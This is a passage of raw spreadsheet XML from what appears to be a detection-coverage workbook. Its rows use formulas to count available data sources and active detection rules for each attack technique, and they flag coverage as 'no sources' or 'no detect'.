        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M602" s="9" cm="1">
        <f t="array" ref="M602">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N602" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O602" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P602" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S60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02" t="s">
        <v>2513</v>
      </c>
      <c r="U602" t="s">
        <v>2770</v>
      </c>
      <c r="V602" t="s">
        <v>2669</v>
      </c>
      <c r="W602" t="b">
        <v>1</v>
      </c>
      <c r="X602" t="s">
        <v>2757</v>
      </c>
    </row>
    <row r="603" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A603" t="s">
        <v>2757</v>
      </c>
      <c r="B603" t="s">
        <v>2771</v>
      </c>
      <c r="C603" t="s">
        <v>2772</v>
      </c>
      <c r="D603" t="s">
        <v>0</v>
      </c>
      <c r="F603" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G603" s="9" cm="1">
        <f t="array" ref="G603">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H603" s="9" t="str" cm="1">
        <f t="array" ref="H603">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I603" s="9" t="str" cm="1">
        <f t="array" ref="I603">IF(SUM(IF($C603=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C603=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J603" s="9" t="str" cm="1">
        <f t="array" ref="J60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03" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M603" s="9" cm="1">
        <f t="array" ref="M603">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N603" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O603" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P603" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S60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03" t="s">
        <v>2513</v>
      </c>
      <c r="U603" t="s">
        <v>2773</v>
      </c>
      <c r="V603" t="s">
        <v>2669</v>
      </c>
      <c r="W603" t="b">
        <v>1</v>
      </c>
      <c r="X603" t="s">
        <v>2757</v>
      </c>
    </row>
    <row r="604" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A604" t="s">
        <v>2774</v>
      </c>
      <c r="B604" t="s">
        <v>2774</v>
      </c>
      <c r="C604" t="s">
        <v>90</v>
      </c>
      <c r="D604" t="s">
        <v>0</v>
      </c>
      <c r="F604" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G604" s="9" cm="1">
        <f t="array" ref="G604">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H604" s="9" cm="1">
        <f t="array" ref="H604">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I604" s="9" t="str" cm="1">
        <f t="array" ref="I604">IF(SUM(IF($C604=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C604=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J604" s="9" cm="1">
        <f t="array" ref="J60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604" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M604" s="9" cm="1">
        <f t="array" ref="M604">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N604" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O604" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P604" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S60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04" t="s">
        <v>2513</v>
      </c>
      <c r="U604" t="s">
        <v>2775</v>
      </c>
      <c r="V604" t="s">
        <v>2669</v>
      </c>
      <c r="W604" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="605" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A605" t="s">
        <v>2774</v>
      </c>
      <c r="B605" t="s">
        <v>2776</v>
      </c>
      <c r="C605" t="s">
        <v>2777</v>
      </c>
      <c r="D605" t="s">
        <v>0</v>
      </c>
      <c r="F605" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G605" s="9" cm="1">
        <f t="array" ref="G605">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H605" s="9" t="str" cm="1">
        <f t="array" ref="H605">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I605" s="9" t="str" cm="1">
        <f t="array" ref="I605">IF(SUM(IF($C605=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C605=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J605" s="9" t="str" cm="1">
        <f t="array" ref="J60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05" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M605" s="9" cm="1">
        <f t="array" ref="M605">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N605" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O605" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P605" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S60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05" t="s">
        <v>2513</v>
      </c>
      <c r="U605" t="s">
        <v>2778</v>
      </c>
      <c r="V605" t="s">
        <v>2669</v>
      </c>
      <c r="W605" t="b">
        <v>1</v>
      </c>
      <c r="X605" t="s">
        <v>2774</v>
      </c>
    </row>
    <row r="606" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A606" t="s">
        <v>2774</v>
      </c>
      <c r="B606" t="s">
        <v>2779</v>
      </c>
      <c r="C606" t="s">
        <v>2780</v>
      </c>
      <c r="D606" t="s">
        <v>0</v>
      </c>
      <c r="F606" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G606" s="9" cm="1">
        <f t="array" ref="G606">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H606" s="9" t="str" cm="1">
        <f t="array" ref="H606">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I606" s="9" t="str" cm="1">
        <f t="array" ref="I606">IF(SUM(IF($C606=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C606=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J606" s="9" t="str" cm="1">
        <f t="array" ref="J60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06" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M606" s="9" cm="1">
        <f t="array" ref="M606">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N606" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O606" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P606" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S60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06" t="s">
        <v>2513</v>
      </c>
      <c r="U606" t="s">
        <v>2781</v>
      </c>
      <c r="V606" t="s">
        <v>2669</v>
      </c>
      <c r="W606" t="b">
        <v>1</v>
      </c>
      <c r="X606" t="s">
        <v>2774</v>
      </c>
    </row>
    <row r="607" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A607" t="s">
        <v>2782</v>
      </c>
      <c r="B607" t="s">
        <v>2782</v>
      </c>
      <c r="C607" t="s">
        <v>76</v>
      </c>
      <c r="D607" t="s">
        <v>0</v>
      </c>
      <c r="E607" t="s">
        <v>1698</v>
      </c>
      <c r="F607" s="9">
        <f t="shared" si="9"/>
        <v>3</v>
      </c>
      <c r="G607" s="9" cm="1">
        <f t="array" ref="G607">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H607" s="9" cm="1">
        <f t="array" ref="H607">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I607" s="9" t="str" cm="1">
        <f t="array" ref="I607">IF(SUM(IF($C607=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C607=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J607" s="9" cm="1">
        <f t="array" ref="J60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607" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M607" s="9" cm="1">
        <f t="array" ref="M607">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N607" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O607" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P607" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S60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07" t="s">
        <v>2513</v>
      </c>
      <c r="U607" t="s">
        <v>2783</v>
      </c>
      <c r="V607" t="s">
        <v>2784</v>
      </c>
      <c r="W607" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="608" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A608" t="s">
        <v>2782</v>
      </c>
      <c r="B608" t="s">
        <v>2785</v>
      </c>
      <c r="C608" t="s">
        <v>2786</v>
      </c>
      <c r="D608" t="s">
        <v>0</v>
      </c>
      <c r="E608" t="s">
        <v>1698</v>
      </c>
      <c r="F608" s="9">
        <f t="shared" si="9"/>
        <v>3</v>
      </c>
      <c r="G608" s="9" cm="1">
        <f t="array" ref="G608">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H608" s="9" t="str" cm="1">
        <f t="array" ref="H608">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I608" s="9" t="str" cm="1">
        <f t="array" ref="I608">IF(SUM(IF($C608=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C608=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J608" s="9" t="str" cm="1">
        <f t="array" ref="J60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08" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M608" s="9" cm="1">
        <f t="array" ref="M608">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N608" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O608" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P608" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S60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08" t="s">
        <v>2513</v>
      </c>
      <c r="U608" t="s">
        <v>2787</v>
      </c>
      <c r="V608" t="s">
        <v>2788</v>
      </c>
      <c r="W608" t="b">
        <v>1</v>
      </c>
      <c r="X608" t="s">
        <v>2782</v>
      </c>
    </row>
    <row r="609" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A609" t="s">
        <v>2782</v>
      </c>
      <c r="B609" t="s">
        <v>2789</v>
      </c>
      <c r="C609" t="s">
        <v>331</v>
      </c>
      <c r="D609" t="s">
        <v>0</v>
      </c>
      <c r="E609" t="s">
        <v>1698</v>
      </c>
      <c r="F609" s="9">
        <f t="shared" si="9"/>
        <v>3</v>
      </c>
      <c r="G609" s="9" cm="1">
        <f t="array" ref="G609">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H609" s="9" t="str" cm="1">
        <f t="array" ref="H609">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I609" s="9" t="str" cm="1">
        <f t="array" ref="I609">IF(SUM(IF($C609=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C609=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J609" s="9" t="str" cm="1">
        <f t="array" ref="J60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09" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M609" s="9" cm="1">
        <f t="array" ref="M609">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N609" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O609" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P609" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S60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09" t="s">
        <v>2513</v>
      </c>
      <c r="U609" t="s">
        <v>2790</v>
      </c>
      <c r="V609" t="s">
        <v>2791</v>
      </c>
      <c r="W609" t="b">
        <v>1</v>
      </c>
      <c r="X609" t="s">
        <v>2782</v>
      </c>
    </row>
    <row r="610" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A610" t="s">
        <v>2782</v>
      </c>
      <c r="B610" t="s">
        <v>2792</v>
      </c>
      <c r="C610" t="s">
        <v>2793</v>
      </c>
      <c r="D610" t="s">
        <v>0</v>
      </c>
      <c r="E610" t="s">
        <v>1698</v>
      </c>
      <c r="F610" s="9">
        <f t="shared" si="9"/>
        <v>3</v>
      </c>
      <c r="G610" s="9" cm="1">
        <f t="array" ref="G610">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H610" s="9" t="str" cm="1">
        <f t="array" ref="H610">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I610" s="9" t="str" cm="1">
        <f t="array" ref="I610">IF(SUM(IF($C610=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C610=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J610" s="9" t="str" cm="1">
        <f t="array" ref="J61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10" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M610" s="9" cm="1">
        <f t="array" ref="M610">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N610" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O610" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P610" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S61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10" t="s">
        <v>2513</v>
      </c>
      <c r="U610" t="s">
        <v>2794</v>
      </c>
      <c r="V610" t="s">
        <v>2795</v>
      </c>
      <c r="W610" t="b">
        <v>1</v>
      </c>
      <c r="X610" t="s">
        <v>2782</v>
      </c>
    </row>
    <row r="611" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A611" t="s">
        <v>2782</v>
      </c>
      <c r="B611" t="s">
        <v>2796</v>
      </c>
      <c r="C611" t="s">
        <v>2797</v>
      </c>
      <c r="D611" t="s">
        <v>0</v>
      </c>
      <c r="E611" t="s">
        <v>549</v>
      </c>
      <c r="F611" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G611" s="9" cm="1">
        <f t="array" ref="G611">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H611" s="9" t="str" cm="1">
        <f t="array" ref="H611">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I611" s="9" t="str" cm="1">
        <f t="array" ref="I611">IF(SUM(IF($C611=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C611=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J611" s="9" t="str" cm="1">
        <f t="array" ref="J61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11" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M611" s="9" cm="1">
        <f t="array" ref="M611">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N611" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O611" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P611" s="14" t="str">
